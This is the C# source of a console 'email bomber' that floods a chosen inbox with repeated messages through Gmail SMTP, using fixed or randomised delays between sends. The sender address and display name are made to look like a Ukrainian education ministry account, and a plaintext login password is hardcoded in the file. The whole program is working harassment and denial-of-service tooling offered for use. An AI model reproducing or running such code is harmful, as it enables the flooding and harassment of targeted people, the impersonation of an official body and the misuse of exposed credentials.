using System;
using System.Net;
using System.IO;
using System.Threading;
using System.Net.Mail;

namespace NetConsoleApp
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Start email Bomber v2000");
            Console.WriteLine("Autor : neutron,Bodun,evangelist");
            // отправитель - устанавливаем адрес и отображаемое в письме имя
            MailAddress from = new MailAddress("ministerosvitu.official@gmail.com", "Міністер");
           
            // кому отправляем
            Console.WriteLine("email target:");
            string target = Console.ReadLine();
            MailAddress to = new MailAddress(target);
            Console.WriteLine("done!");
            // создаем объект сообщения
            Console.WriteLine("email count:");
            int count = int.Parse(Console.ReadLine());
            MailMessage m = new MailMessage(from, to);
            // тема письма
             Console.WriteLine("tema of email:");
            string tema = Console.ReadLine();
            m.Subject = tema;
            Console.WriteLine("body of email:");
            string body = Console.ReadLine();
            // текст письма
            m.Body = body;
            Console.WriteLine("do u use html y/n");
            string shtml = Console.ReadLine();
            bool html = false;
            if (shtml == "y")
                html = true;
            
            // письмо представляет код html
            m.IsBodyHtml = html;
            // адрес smtp-сервера и порт, с которого будем отправлять письмо
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            // логин и пароль
            Console.WriteLine("smtp ok!");
            smtp.Credentials = new NetworkCredential("ministerosvitu.official@gmail.com", "vova345756");
            Console.WriteLine("password done!");
            smtp.EnableSsl = true;
            Console.WriteLine("Fixsed or random time f/r");
            string fr = Console.ReadLine();
            bool FixetTime;
            if (fr == "f")
                FixetTime = true;
            else
                FixetTime = false;
            int randFrom =0;
            int randTo = 0;
            if (FixetTime)
                Console.WriteLine("Time bettwen sending email in ms");
            else
            {
                Console.WriteLine("Random from");
                randFrom = int.Parse(Console.ReadLine());
                Console.WriteLine("Random to");
                randTo = int.Parse(Console.ReadLine());
            }
            int timeMS = int.Parse(Console.ReadLine());
            for (int i = 0; i < count; i++)
            {
                try
                {
                    smtp.Send(m);
                    if(FixetTime)
                    Thread.Sleep(timeMS);
                    else
                    {
                        Random r = new Random();
                        int rd = r.Next(randFrom, randTo);
                        Thread.Sleep(rd);
                    }
                    
                    Console.WriteLine("mail {0} sended at {1}:{2}:{3}:{4}", i + 1,DateTime.Now.Hour,DateTime.Now.Minute,DateTime.Now.Second,DateTime.Now.Millisecond);
                }
                catch
                {
                    Console.WriteLine("Error");
                }
            }
            Console.WriteLine("end");
            Console.ReadKey();
        }
    }
}   